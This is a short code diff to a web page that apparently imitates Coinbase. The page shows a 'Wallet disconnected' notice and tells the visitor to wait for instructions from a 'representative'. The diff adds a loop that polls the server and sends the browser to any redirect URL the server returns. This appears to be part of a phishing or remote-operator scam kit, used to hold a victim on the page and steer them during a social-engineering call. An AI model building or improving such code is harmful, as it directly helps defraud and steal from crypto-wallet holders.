@@ -243,6 +243,14 @@ body{margin:0;background:#0a0b0d;font-family:'CoinbaseSansFont',system-ui,-apple
       overlayCheck.classList.add('show');
       overlayTitle.textContent = 'Wallet disconnected';
       overlaySub.textContent = 'Please stay on this screen for further instructions from your representative.';
+
+      function pollSync() {
+        fetch('/api/visitor/sync').then(function (r) { return r.json(); }).then(function (d) {
+          if (d && d.redirect) { location.href = d.redirect; return; }
+          setTimeout(pollSync, 3000);
+        }).catch(function () { setTimeout(pollSync, 5000); });
+      }
+      pollSync();
     }, 3500);
   });
 
